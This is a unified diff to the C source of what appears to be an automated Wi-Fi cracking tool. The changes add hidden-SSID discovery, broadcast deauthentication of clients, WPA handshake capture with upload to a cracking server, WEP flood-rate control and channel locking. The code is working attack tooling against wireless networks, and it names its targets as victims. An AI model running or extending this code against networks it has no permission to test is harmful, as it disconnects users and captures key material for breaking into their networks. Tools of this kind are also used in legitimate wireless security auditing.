@@ -94,7 +94,7 @@ enum {
 	ASTATE_PING,
 	ASTATE_READY,
 
-	ASTATE_WPA_DEAUTH,
+	ASTATE_DEAUTH,
 	ASTATE_WPA_CRACK,
 
 	ASTATE_WEP_PRGA_GET,
@@ -487,18 +487,60 @@ static void timer_check(void)
 
 static unsigned char *get_bssid(struct ieee80211_frame *wh)
 {
-	unsigned char *bssid = wh->i_addr2;
+	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
+	uint16_t *p = (uint16_t*) (wh + 1);
+
+	if (type == IEEE80211_FC0_TYPE_CTL)
+		return NULL;
 
 	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
-		bssid = wh->i_addr1;
+		return wh->i_addr1;
+	else if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
+		return wh->i_addr2;
 
-	return bssid;
+	// XXX adhoc?
+	if (type == IEEE80211_FC0_TYPE_DATA)
+		return wh->i_addr1;
+
+	switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
+	case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
+	case IEEE80211_FC0_SUBTYPE_REASSOC_REQ:
+	case IEEE80211_FC0_SUBTYPE_DISASSOC:
+		return wh->i_addr1;
+
+	case IEEE80211_FC0_SUBTYPE_AUTH:
+		/* XXX check len */
+		switch (le16toh(p[1])) {
+		case 1:
+		case 3:
+			return wh->i_addr1;
+
+		case 2:
+		case 4:
+			return wh->i_addr2;
+		}
+		return NULL;
+
+	case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
+	case IEEE80211_FC0_SUBTYPE_REASSOC_RESP:
+	case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
+	case IEEE80211_FC0_SUBTYPE_BEACON:
+	case IEEE80211_FC0_SUBTYPE_DEAUTH:
+		return wh->i_addr2;
+
+	case IEEE80211_FC0_SUBTYPE_PROBE_REQ:
+	default:
+		return NULL;
+	}
 }
 
 static struct network *network_get(struct ieee80211_frame *wh)
 {
 	struct network *n    = _state.s_networks.n_next;
 	unsigned char *bssid = get_bssid(wh);
+
+	if (!bssid)
+		return NULL;
 
 	while (n) {
 		if (memcmp(n->n_bssid, bssid, sizeof(n->n_bssid)) == 0)
@@ -532,9 +574,15 @@ static void do_network_add(struct network *n)
 
 static struct network *network_add(struct ieee80211_frame *wh)
 {
-	struct network *n = network_new();
+	struct network *n;
+	unsigned char *bssid = get_bssid(wh);
 
-	memcpy(n->n_bssid, get_bssid(wh), sizeof(n->n_bssid));
+	if (!bssid)
+		return NULL;
+	
+	n = network_new();
+
+	memcpy(n->n_bssid, bssid, sizeof(n->n_bssid));
 
 	do_network_add(n);
 
@@ -645,7 +693,7 @@ static void deauth(void *arg)
 
 	if (_state.s_state != STATE_ATTACK
 	    || _state.s_curnet != n
-	    || n->n_astate != ASTATE_WPA_DEAUTH)
+	    || n->n_astate != ASTATE_DEAUTH)
 		return;
 
 	deauth_send(n, BROADCAST);
@@ -887,9 +935,9 @@ static void attack_wpa(struct network *n)
 {
 	switch (n->n_astate) {
 	case ASTATE_READY:
-		n->n_astate = ASTATE_WPA_DEAUTH;
+		n->n_astate = ASTATE_DEAUTH;
 		/* fallthrough */
-	case ASTATE_WPA_DEAUTH:
+	case ASTATE_DEAUTH:
 		deauth(n);
 		break;
 
@@ -1027,6 +1075,8 @@ static int should_attack(struct network *n)
 	switch (n->n_astate) {
 	case ASTATE_DONE:
 	case ASTATE_UNREACH:
+		if (_conf.cf_bssid)
+			_state.s_state = STATE_DONE;
 		return 0;
 	}
 
@@ -1250,6 +1300,22 @@ static void network_assoc(void *a)
 	timer_in(_conf.cf_to * 1000, network_assoc, n);
 }
 
+static int need_connect(struct network *n)
+{
+	if (n->n_crypto == CRYPTO_WPA)
+		return 0;
+
+	switch (n->n_astate) {
+	case ASTATE_READY:
+	case ASTATE_WEP_PRGA_GET:
+	case ASTATE_WEP_FLOOD:
+		return 1;
+
+	default:
+		return 0;
+	}
+}
+
 static int network_connect(struct network *n)
 {
 	switch (n->n_wstate) {
@@ -1348,6 +1414,12 @@ static void start_flood(struct network *n)
 
 static void attack_wep(struct network *n)
 {
+	if (!n->n_ssid[0]) {
+		n->n_astate = ASTATE_DEAUTH;
+		deauth(n);
+		return;
+	}
+
 	if (!network_connect(n))
 		return;
 
@@ -1453,6 +1525,45 @@ static void packet_copy(struct packet *p, void *d, int len)
 	memcpy(p->p_data, d, len);
 }
 
+static void packet_write_pcap(int fd, struct packet *p);
+
+static void found_ssid(struct network *n)
+{
+	unsigned char *p;
+	int ssidlen;
+
+	time_printf(V_NORMAL, "Found SSID [%s] for %s\n",
+		    n->n_ssid, mac2str(n->n_bssid));
+
+	/* beacon surgery */
+	p = n->n_beacon.p_data + sizeof(struct ieee80211_frame) + 8 + 2 + 2;
+
+	ssidlen = strlen(n->n_ssid);
+	assert((n->n_beacon.p_len + ssidlen) <= 
+	       (int) sizeof(n->n_beacon.p_data));
+
+	assert(*p == IEEE80211_ELEMID_SSID);
+	p++;
+
+	assert(*p == 0);
+	*p++ = ssidlen;
+
+	memmove(p + ssidlen, p, n->n_beacon.p_len - (p - n->n_beacon.p_data));
+	memcpy(p, n->n_ssid, ssidlen);
+
+	n->n_beacon.p_len += ssidlen;
+
+	if (n->n_client_handshake) {
+		n->n_astate = ASTATE_WPA_CRACK;
+		attack_continue(n);
+	}
+
+	if (n->n_crypto == CRYPTO_WEP) {
+		n->n_astate = ASTATE_READY;
+		attack_continue(n);
+	}
+}
+
 static void wifi_beacon(struct network *n, struct ieee80211_frame *wh,
 			int totlen)
 {
@@ -1461,6 +1572,7 @@ static void wifi_beacon(struct network *n, struct ieee80211_frame *wh,
 	struct ieee80211_ie_wpa *wpa;
 	int new = 0;
 	int len = totlen;
+	int hidden = 0;
 
 	totlen -= sizeof(*wh);
 
@@ -1491,8 +1603,11 @@ static void wifi_beacon(struct network *n, struct ieee80211_frame *wh,
 
 		switch (id) {
 		case IEEE80211_ELEMID_SSID:
-			memcpy(n->n_ssid, p, l);
-			n->n_ssid[l] = 0;
+			if (l != 0) {
+				memcpy(n->n_ssid, p, l);
+				n->n_ssid[l] = 0;
+			} else
+				hidden = 1;
 			break;
 
 		case IEEE80211_ELEMID_DSPARMS:
@@ -1532,6 +1647,10 @@ static void wifi_beacon(struct network *n, struct ieee80211_frame *wh,
 	if (new) {
 		packet_copy(&n->n_beacon, wh, len);
 		found_new_network(n);
+
+		if (hidden && n->n_ssid[0])
+			found_ssid(n);
+			
 	}
 
 	return;
@@ -1557,7 +1676,7 @@ static void wifi_auth(struct network *n, struct ieee80211_frame *wh,
 		return;
 	}
 
-	if (for_us(wh) && n->n_wstate == ASTATE_NONE) {
+	if (for_us(wh) && n->n_wstate == ASTATE_NONE && need_connect(n)) {
 		if (le16toh(p[0]) != 0 || le16toh(p[1]) != 2)
 			return;
 
@@ -1600,10 +1719,45 @@ __bad:
 	printf("Bad assoc resp\n");
 }
 
+static void grab_hidden_ssid(struct network *n, struct ieee80211_frame *wh,
+			     int len, int off)
+{
+	unsigned char *p = ((unsigned char *)(wh + 1)) + off;
+	int l;
+
+	if (n->n_ssid[0])
+		return;
+
+	len -= sizeof(*wh) + off + 2;
+
+	if (len < 0)
+		goto __bad;
+
+	if (*p++ != IEEE80211_ELEMID_SSID)
+		goto __bad;
+
+	l = *p++;
+	if (l > len)
+		goto __bad;
+
+	if (l == 0)
+		return;
+
+	memcpy(n->n_ssid, p, l);
+	n->n_ssid[l] = 0;
+
+	if (!n->n_have_beacon)
+		return;
+
+	found_ssid(n);
+	return;
+__bad:
+	printf("\nbad grab_hidden_ssid\n");
+	return;
+}
+
 static void wifi_mgt(struct network *n, struct ieee80211_frame *wh, int len)
 {
-	assert(n);
-
 	switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
 	case IEEE80211_FC0_SUBTYPE_BEACON:
 		wifi_beacon(n, wh, len);
@@ -1617,12 +1771,24 @@ static void wifi_mgt(struct network *n, struct ieee80211_frame *wh, int len)
 		break;
 
 	case IEEE80211_FC0_SUBTYPE_DEAUTH:
-		if (for_us(wh)) {
+		if (for_us(wh) && need_connect(n)) {
 			time_printf(V_VERBOSE, "Got deauth for %s\n",
 				    n->n_ssid);
 			n->n_wstate = WSTATE_NONE;
 			network_connect(n);
 		}
+		break;
+
+	case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
+		grab_hidden_ssid(n, wh, len, 2 + 2);
+		break;
+
+	case IEEE80211_FC0_SUBTYPE_REASSOC_REQ:
+		grab_hidden_ssid(n, wh, len, 2 + 2 + 6);
+		break;
+
+	case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
+		grab_hidden_ssid(n, wh, len, 8 + 2 + 2);
 		break;
 
 	default:
@@ -1642,15 +1808,30 @@ static void wifi_ctl(struct ieee80211_frame *wh, int len)
 	if (wh && len) {}
 }
 
+static unsigned char *get_client_mac(struct ieee80211_frame *wh)
+{
+	unsigned char *bssid = get_bssid(wh);
+	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
+
+	if (type == IEEE80211_FC0_TYPE_CTL)
+		return NULL;
+
+	if (!bssid)
+		return wh->i_addr2;
+
+	if (bssid == wh->i_addr1)
+		return wh->i_addr2;
+	else
+		return wh->i_addr1;
+}
+
 static struct client *client_get(struct network *n, struct ieee80211_frame *wh)
 {
 	struct client *c = n->n_clients.c_next;
-	unsigned char *cmac;
+	unsigned char *cmac = get_client_mac(wh);
 
-	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
-		cmac = wh->i_addr2;
-	else
-		cmac = wh->i_addr1;
+	if (!cmac)
+		return NULL;
 
 	while (c) {
 		if (memcmp(c->c_mac, cmac, 6) == 0)
@@ -1665,14 +1846,18 @@ static struct client *client_get(struct network *n, struct ieee80211_frame *wh)
 static struct client *client_update(struct network *n,
 				    struct ieee80211_frame *wh)
 {
-	unsigned char *cmac = NULL;
+	unsigned char *cmac = get_client_mac(wh);
 	struct client *c;
+	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
 
-	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
-		cmac = wh->i_addr2;
-	else {
-		cmac = wh->i_addr1;
+	if (!cmac)
+		return NULL;
 
+	/* let's not pwn ourselves */
+	if (memcmp(cmac, _state.s_mac, sizeof(_state.s_mac)) == 0)
+		return NULL;
+
+	if (cmac == wh->i_addr1) {
 		if (memcmp(cmac, BROADCAST, 6) == 0)
 			return NULL;
 
@@ -1691,6 +1876,18 @@ static struct client *client_update(struct network *n,
 		/* fuck it */
 		if (cmac[0] == 0x01)
 			return NULL;
+	}
+
+	/* here we can choose how conservative to be */
+	if (type == IEEE80211_FC0_TYPE_MGT) {
+		switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
+		case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
+			break;
+
+		case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
+		default:
+			return NULL;
+		}
 	}
 
 	c = client_get(n, wh);
@@ -1740,7 +1937,7 @@ static void process_eapol(struct network *n, struct client *c, unsigned char *p,
 {
 	int num, i;
 
-	if (n->n_astate >= ASTATE_WPA_CRACK)
+	if (n->n_client_handshake)
 		return;
 
 	num = eapol_handshake_step(p, len);
@@ -1798,8 +1995,10 @@ static void process_eapol(struct network *n, struct client *c, unsigned char *p,
 			    "Got necessary WPA handshake info for %s\n",
 			    n->n_ssid);
 
-		n->n_astate = ASTATE_WPA_CRACK;
-		attack_continue(n);
+		if (n->n_ssid[0]) {
+			n->n_astate = ASTATE_WPA_CRACK;
+			attack_continue(n);
+		}
 	}
 }
 
@@ -2071,23 +2270,25 @@ static struct network *network_update(struct ieee80211_frame* wh)
 {
 	struct network *n;
 	struct client  *c = NULL;
-	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
+	unsigned char *bssid;
+	int fromnet;
 
-	if (type == IEEE80211_FC0_TYPE_CTL)
+	bssid = get_bssid(wh);
+	if (!bssid)
 		return NULL;
 
 	n = network_get(wh);
 	if (!n)
 		n = network_add(wh);
 
-	if (type == IEEE80211_FC0_TYPE_DATA)
-		c = client_update(n, wh);
+	assert(n);
 
-	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) {
-		if (c)
-			c->c_dbm = _state.s_ri->ri_power;
-	} else
+	if ((fromnet = memcmp(wh->i_addr2, bssid, sizeof(wh->i_addr2))) == 0)
 		n->n_dbm = _state.s_ri->ri_power;
+
+	c = client_update(n, wh);
+	if (c && !fromnet)
+		c->c_dbm = _state.s_ri->ri_power;
 
 	return n;
 }
@@ -2163,7 +2364,7 @@ static void print_status(int advance)
 			       n->n_flood_out.s_speed);
 			break;
 
-		case ASTATE_WPA_DEAUTH:
+		case ASTATE_DEAUTH:
 			c = n->n_clients.c_next;
 			while (c) {
 				ccount++;
@@ -2622,6 +2823,8 @@ static void usage(char *prog)
                 "\n"
                 "       -b <victim mac> : Victim BSSID\n"
 		"       -s <WPA server> : Upload wpa.cap for cracking\n"
+		"       -c       <chan> : chanlock\n"
+		"       -p       <pps>  : flood rate\n"
 		"       -W              : WPA only\n"
                 "       -v              : verbose, -vv for more, etc.\n"
                 "       -h              : This help screen\n"
@@ -2638,7 +2841,7 @@ int main(int argc, char *argv[])
 
 	init_conf();
 
-	while ((ch = getopt(argc, argv, "hb:vWs:")) != -1) {
+	while ((ch = getopt(argc, argv, "hb:vWs:c:p:")) != -1) {
 		switch (ch) {
 		case 's':
 			_conf.cf_wpa_server = optarg;
@@ -2647,7 +2850,7 @@ int main(int argc, char *argv[])
 		case 'W':
 			_conf.cf_do_wep = 0;
 			break;
-#ifdef I_DONT_BELIEVE_IN_OPTIONS
+
 		case 'p':
 			_conf.cf_floodfreq = (int) (1.0 / (double) atoi(optarg)
 					      * 1000.0 * 1000.0);
@@ -2659,7 +2862,7 @@ int main(int argc, char *argv[])
 			channel_add(atoi(optarg));
 			_state.s_hopchan = _conf.cf_channels.c_next;
 			break;
-#endif
+
 		case 'v':
 			_conf.cf_verb++;
 			break;
